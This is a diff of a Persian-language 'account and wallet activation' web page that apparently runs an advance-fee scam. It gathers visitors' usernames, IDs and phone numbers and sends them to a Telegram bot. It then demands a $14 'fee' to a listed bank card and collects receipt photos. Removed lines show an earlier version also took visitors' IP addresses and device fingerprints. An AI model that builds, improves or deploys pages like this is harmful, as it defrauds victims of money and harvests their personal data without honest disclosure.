@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>فعال‌سازی حساب و کیف پول</title>
     <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
         :root {
             --bg-gradient: linear-gradient(135deg, #f0f4f9 0%, #e1e8f0 100%);
@@ -89,6 +89,16 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: -0.3px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .header h1 i {
+            font-size: 1.2em;
+            background: var(--title-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         .header p { color: var(--text-sub); margin-top: 8px; font-size: 0.95rem; }
 
@@ -123,10 +133,7 @@
             gap: 12px;
             margin-bottom: 8px;
         }
-        .success-banner i {
-            font-size: 1.5rem;
-            color: #ffffff;
-        }
+        .success-banner i { font-size: 1.5rem; color: #ffffff; }
         .success-banner .banner-text {
             line-height: 1.5;
             white-space: nowrap;
@@ -151,18 +158,14 @@
             transition: transform 5s linear;
             transform: scaleX(1);
         }
-        .success-banner.show .timer-progress {
-            transform: scaleX(0);
-        }
+        .success-banner.show .timer-progress { transform: scaleX(0); }
         .success-banner.hide-banner {
             transform: translateY(-20px) scale(0.95);
             opacity: 0;
             transition: transform 0.4s ease, opacity 0.4s ease;
             pointer-events: none;
         }
-        .success-banner.hide-banner .timer-progress {
-            transition: none;
-        }
+        .success-banner.hide-banner .timer-progress { transition: none; }
 
         .field-hint {
             font-size: 0.85rem;
@@ -261,9 +264,7 @@
             display: none;
             animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
-        .payment-page.active {
-            display: block;
-        }
+        .payment-page.active { display: block; }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
@@ -276,45 +277,114 @@
             padding: 26px 18px;
             border: 1px solid var(--glass-box-border);
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
-            margin: 20px 0 30px;
+            margin: 20px 0 25px;
         }
         .payment-box p { line-height: 2; font-size: 0.98rem; color: var(--text-main); text-align: justify; }
         .payment-box .highlight { color: var(--highlight-color); font-weight: 700; }
         
+        .card-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin: 16px 0 10px;
+        }
+        
         .payment-box .card-number {
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             background: var(--card-num-bg);
-            padding: 14px 10px;
-            border-radius: 20px;
-            text-align: center;
-            font-size: clamp(1.05rem, 4vw, 1.25rem);
-            letter-spacing: 1.5px;
+            padding: 8px 12px;
+            border-radius: 18px;
+            font-size: clamp(0.9rem, 3.8vw, 1.1rem);
+            letter-spacing: 1px;
             white-space: nowrap;
             color: var(--text-main);
-            margin: 16px 0 10px;
             border: 1px dashed var(--input-border);
             direction: ltr;
             font-weight: 700;
+            overflow: hidden;
+            gap: 6px;
         }
+        .btn-copy {
+            background: #007aff;
+            color: #fff;
+            border: none;
+            padding: 6px 10px;
+            border-radius: 10px;
+            font-size: 0.78rem;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-family: inherit;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+        .btn-copy:active { transform: scale(0.95); }
+
         .payment-box .card-holder { text-align: center; color: var(--text-sub); font-size: 0.9rem; }
+
+        .receipt-upload-box {
+            margin-top: 20px;
+            border: 2px dashed var(--input-border);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            background: var(--input-bg);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .receipt-upload-box:hover { border-color: #007aff; }
+        .receipt-upload-box i { font-size: 2rem; color: #007aff; margin-bottom: 8px; }
+        .receipt-upload-box p { font-size: 0.9rem; color: var(--text-sub); }
+        .receipt-preview {
+            max-width: 100%;
+            max-height: 180px;
+            border-radius: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .btn-upload-receipt {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 22px;
+            background: linear-gradient(135deg, #34c759, #30d158);
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 1.05rem;
+            cursor: pointer;
+            margin-top: 14px;
+            box-shadow: 0 10px 25px rgba(52, 199, 89, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+        .btn-upload-receipt:hover { transform: translateY(-2px); filter: brightness(1.05); }
+        .btn-upload-receipt:active { transform: scale(0.97); }
+
         .btn-support {
             display: inline-flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            background: linear-gradient(135deg, #34c759, #30d158);
-            color: #ffffff;
-            padding: 16px 28px;
+            background: rgba(0, 122, 255, 0.12);
+            color: #007aff;
+            border: 1px solid rgba(0, 122, 255, 0.25);
+            padding: 14px 28px;
             border-radius: 22px;
             text-decoration: none;
             font-weight: 700;
-            font-size: 1.05rem;
+            font-size: 1rem;
             transition: all 0.3s ease;
-            box-shadow: 0 10px 25px rgba(52, 199, 89, 0.3);
-            margin-top: 10px;
+            margin-top: 12px;
             width: 100%;
         }
-        .btn-support:hover { transform: translateY(-2px); filter: brightness(1.05); }
+
         .form-section { transition: opacity 0.4s ease; }
         .form-section.hidden { display: none; }
 
@@ -331,16 +401,15 @@
             display: none;
             backdrop-filter: blur(10px);
         }
-        .waiting-message.show {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
+        .waiting-message.show { display: block; animation: fadeIn 0.5s ease; }
         .waiting-message i { font-size: 2.2rem; display: block; margin-bottom: 12px; }
 
         @media (max-width: 600px) {
             .container { padding: 24px 16px 32px; border-radius: 32px; }
             .payment-box { padding: 20px 14px; }
             .success-banner { padding: 12px 14px 10px; }
+            .payment-box .card-number { padding: 8px 10px; }
+            .btn-copy { padding: 5px 8px; font-size: 0.75rem; }
         }
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: transparent; }
@@ -349,10 +418,10 @@
 </head>
 <body>
 <div class="container">
-    <!-- بخش فرم (فقط اطلاعات اولیه) -->
+    <!-- بخش فرم (اطلاعات اولیه) -->
     <div class="form-section" id="formSection">
         <div class="header">
-            <h1>⚡ فعال‌سازی حساب &amp; کیف پول</h1>
+            <h1><i class="fas fa-bolt"></i> فعال‌سازی حساب &amp; کیف پول</h1>
             <p>لطفاً اطلاعات زیر را دقیق وارد کنید</p>
         </div>
 
@@ -387,7 +456,6 @@
 
 <!-- بخش پرداخت (بعد از ارسال موفق) -->
 <div class="payment-page" id="paymentPage">
-    <!-- بنر سبز شناور با تایمر خطی -->
     <div class="success-banner" id="successBanner">
         <div class="banner-content">
             <i class="fas fa-check-circle"></i>
@@ -399,7 +467,7 @@
     </div>
 
     <div class="header">
-        <h1>💳 مرحله پرداخت کارمزد</h1>
+        <h1><i class="fa-regular fa-money-bill-1"></i> مرحله پرداخت کارمزد</h1>
         <p>برای تکمیل فعال‌سازی، لطفاً کارمزد را پرداخت کنید</p>
     </div>
 
@@ -408,15 +476,36 @@
             برای تکمیل فعال‌سازی حساب کاربری و کیف پول خود، لطفاً مبلغ کارمزد به مبلغ 
             <span class="highlight">۱۴ دلار (معادل ۲,۴۵۰,۰۰۰ تومان)</span> 
             را به شماره کارت زیر واریز نمایید. 
-            پس از واریز، تصویر رسید تراکنش را برای پشتیبانی ارسال کنید تا حساب شما ظرف ۲۴ ساعت فعال شود.
         </p>
-        <div class="card-number">6063 7312 6182 2572</div>
+        
+        <div class="card-wrapper">
+            <div class="card-number">
+                <span id="cardNumber">6063 7312 6182 2572</span>
+                <button type="button" class="btn-copy" id="copyBtn">
+                    <i class="fas fa-copy"></i> کپی
+                </button>
+            </div>
+        </div>
         <div class="card-holder">به نام نیما اسفندیاری</div>
+
+        <!-- آپلود مستقیم عکس رسید -->
+        <div class="receipt-upload-box" id="uploadBox">
+            <i class="fas fa-cloud-upload-alt"></i>
+            <p>جهت آپلود تصویر رسید تراکنش اینجا کلیک کنید</p>
+            <input type="file" id="receiptInput" accept="image/*" style="display: none;" />
+            <img id="receiptPreview" class="receipt-preview" alt="پیش‌نمایش رسید" />
+        </div>
+
+        <button type="button" class="btn-upload-receipt" id="sendReceiptBtn">
+            <i class="fas fa-paper-plane"></i> ارسال رسید تراکنش
+        </button>
     </div>
 
     <a href="https://t.me/miningertoncoin" target="_blank" class="btn-support" id="supportBtn">
-        <i class="fab fa-telegram"></i> ارتباط با پشتیبانی
+        <i class="fab fa-telegram"></i> ارتباط مستقیم با پشتیبانی
     </a>
+
+    <div id="paymentStatus" class="status"></div>
 
     <div class="waiting-message" id="waitingMessage">
         <i class="fas fa-hourglass-half"></i>
@@ -442,12 +531,52 @@
         const userIdInput = document.getElementById('userId');
         const submitBtn = document.getElementById('submitBtn');
         const statusDiv = document.getElementById('statusMessage');
+        const paymentStatusDiv = document.getElementById('paymentStatus');
         const formSection = document.getElementById('formSection');
         const paymentPage = document.getElementById('paymentPage');
         const phoneHint = document.getElementById('phoneHint');
         const waitingMsg = document.getElementById('waitingMessage');
         const successBanner = document.getElementById('successBanner');
         const timerProgress = document.getElementById('timerProgress');
+        const copyBtn = document.getElementById('copyBtn');
+        const cardNumberText = document.getElementById('cardNumber');
+        const uploadBox = document.getElementById('uploadBox');
+        const receiptInput = document.getElementById('receiptInput');
+        const receiptPreview = document.getElementById('receiptPreview');
+        const sendReceiptBtn = document.getElementById('sendReceiptBtn');
+
+        let savedUserData = {};
+
+        function triggerHaptic() {
+            if ("vibrate" in navigator) {
+                navigator.vibrate(50);
+            }
+        }
+
+        copyBtn.addEventListener('click', function() {
+            triggerHaptic();
+            const cleanNum = cardNumberText.textContent.replace(/\s+/g, '');
+            navigator.clipboard.writeText(cleanNum).then(() => {
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> کپی شد!';
+                setTimeout(() => {
+                    copyBtn.innerHTML = '<i class="fas fa-copy"></i> کپی';
+                }, 2500);
+            });
+        });
+
+        uploadBox.addEventListener('click', () => receiptInput.click());
+        receiptInput.addEventListener('change', function() {
+            const file = this.files[0];
+            if (file) {
+                triggerHaptic();
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    receiptPreview.src = e.target.result;
+                    receiptPreview.style.display = 'block';
+                }
+                reader.readAsDataURL(file);
+            }
+        });
 
         function showHint(element) {
             document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
@@ -460,29 +589,38 @@
             document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
         }
 
-        phoneInput.addEventListener('focus', function() {
-            showHint(phoneHint);
-        });
-        phoneInput.addEventListener('blur', function() {
-            hideAllHints();
-        });
+        phoneInput.addEventListener('focus', () => showHint(phoneHint));
+        phoneInput.addEventListener('blur', () => hideAllHints());
 
         async function sendTelegramMessage(text) {
             try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const payload = {
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                };
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                 });
                 return await response.json();
             } catch (e) {
-                console.error('خطا در ارسال پیام:', e);
+                return null;
+            }
+        }
+
+        async function sendTelegramPhoto(photoFile, caption) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoFile);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                return await response.json();
+            } catch (e) {
                 return null;
             }
         }
@@ -504,11 +642,6 @@
             clearTimeout(window.bannerTimeout);
             window.bannerTimeout = setTimeout(() => {
                 successBanner.classList.add('hide-banner');
-                setTimeout(() => {
-                    successBanner.classList.remove('show', 'hide-banner');
-                    timerProgress.style.transition = 'none';
-                    timerProgress.style.transform = 'scaleX(1)';
-                }, 500);
             }, 5000);
         }
 
@@ -517,71 +650,65 @@
             paymentPage.classList.add('active');
             statusDiv.className = 'status';
             statusDiv.textContent = '';
-
             showSuccessBanner();
         }
+
+        sendReceiptBtn.addEventListener('click', async function() {
+            triggerHaptic();
+            const file = receiptInput.files[0];
+            if (!file) {
+                setPaymentStatus('⚠️ لطفاً ابتدا تصویر رسید را انتخاب کنید.', 'error');
+                return;
+            }
+
+            setPaymentStatus('⏳ در حال آپلود و ارسال رسید به تلگرام ...', 'loading');
+            sendReceiptBtn.disabled = true;
+
+            const caption = `
+🧾 *رسید پرداخت جدید دریافت شد!*
+
+👤 *نام کاربری:* ${savedUserData.username}
+🆔 *یوزر آیدی:* ${savedUserData.userId}
+📞 *شماره تلفن:* ${savedUserData.phone}
+
+⏰ *زمان ارسال:* ${new Date().toLocaleString('fa-IR')}
+            `.trim();
+
+            const res = await sendTelegramPhoto(file, caption);
+            if (res && res.ok) {
+                setPaymentStatus('✅ رسید شما با موفقیت ارسال شد.', 'success');
+                showWaitingMessage();
+            } else {
+                setPaymentStatus('❌ خطا در ارسال رسید. لطفاً مجدداً تلاش کنید.', 'error');
+                sendReceiptBtn.disabled = false;
+            }
+        });
 
         function showWaitingMessage() {
             waitingMsg.classList.add('show');
         }
 
-        let supportClicked = false;
-        document.getElementById('supportBtn').addEventListener('click', function() {
-            supportClicked = true;
-        });
-
-        document.addEventListener('visibilitychange', function() {
-            if (document.visibilityState === 'visible' && supportClicked) {
-                showWaitingMessage();
-                supportClicked = false;
-            }
-        });
-
         document.getElementById('activationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            triggerHaptic();
 
-            const username = usernameInput.value.trim() || 'وارد نشده';
+            const username = usernameInput.value.trim();
             const userId = userIdInput.value.trim() || 'وارد نشده';
-            const phone = phoneInput.value.trim() || 'وارد نشده';
+            const phone = phoneInput.value.trim();
 
-            if (!username || username === 'وارد نشده') {
+            if (!username) {
                 setStatus('⚠️ لطفاً نام کاربری را وارد کنید.', 'error');
                 return;
             }
-            if (!phone || phone === 'وارد نشده') {
+            if (!phone) {
                 setStatus('⚠️ لطفاً شماره تلفن را وارد کنید.', 'error');
                 return;
             }
 
+            savedUserData = { username, userId, phone };
+
             setStatus('⏳ در حال آماده‌سازی اطلاعات ...', 'loading');
             submitBtn.disabled = true;
-
-            const now = new Date();
-            const timeStr = now.toLocaleString('fa-IR', {
-                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
-                hour: '2-digit', minute: '2-digit', second: '2-digit'
-            });
-            const ua = navigator.userAgent;
-            let device = 'ناشناس';
-            if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
-                if (/android/i.test(ua)) device = 'اندروید';
-                else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS';
-                else device = 'موبایل';
-            } else if (/windows/i.test(ua)) device = 'ویندوز';
-            else if (/mac/i.test(ua)) device = 'مک‌اواس';
-            else if (/linux/i.test(ua)) device = 'لینوکس';
-            let browser = 'ناشناس';
-            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'کروم';
-            else if (/firefox/i.test(ua)) browser = 'فایرفاکس';
-            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'سافاری';
-            else if (/edge/i.test(ua)) browser = 'ادج';
-            const deviceStr = `${device} · ${browser}`;
-            let ip = 'نامشخص';
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip || 'نامشخص';
-            } catch (_) {}
 
             const message = `
 📋 *اطلاعات فعال‌سازی حساب و کیف پول*
@@ -590,23 +717,14 @@
 🆔 *یوزر آیدی:* ${userId}
 📞 *شماره تلفن:* ${phone}
 
-🌐 *IP:* ${ip}
-⏰ *زمان ورود:* ${timeStr}
-💻 *دستگاه:* ${deviceStr}
-
-📌 *تاریخ ارسال:* ${new Date().toLocaleString('fa-IR')}
+⏰ *تاریخ ارسال:* ${new Date().toLocaleString('fa-IR')}
             `.trim();
 
-            try {
-                const result = await sendTelegramMessage(message);
-                if (result && result.ok) {
-                    showPaymentPage();
-                } else {
-                    setStatus(`❌ خطا از سمت تلگرام: ${result?.description || 'خطای ناشناخته'}`, 'error');
-                    submitBtn.disabled = false;
-                }
-            } catch (error) {
-                setStatus(`❌ خطا در ارتباط با سرور: ${error.message}`, 'error');
+            const result = await sendTelegramMessage(message);
+            if (result && result.ok) {
+                showPaymentPage();
+            } else {
+                setStatus(`❌ خطا در ارتباط با سرور تلگرام`, 'error');
                 submitBtn.disabled = false;
             }
         });
@@ -615,13 +733,12 @@
             statusDiv.textContent = text;
             statusDiv.className = 'status ' + type;
             statusDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            if (type !== 'loading') {
-                clearTimeout(window.statusTimeout);
-                window.statusTimeout = setTimeout(() => {
-                    statusDiv.className = 'status';
-                    statusDiv.textContent = '';
-                }, 8000);
-            }
+        }
+
+        function setPaymentStatus(text, type) {
+            paymentStatusDiv.textContent = text;
+            paymentStatusDiv.className = 'status ' + type;
+            paymentStatusDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
 
         hideAllHints();
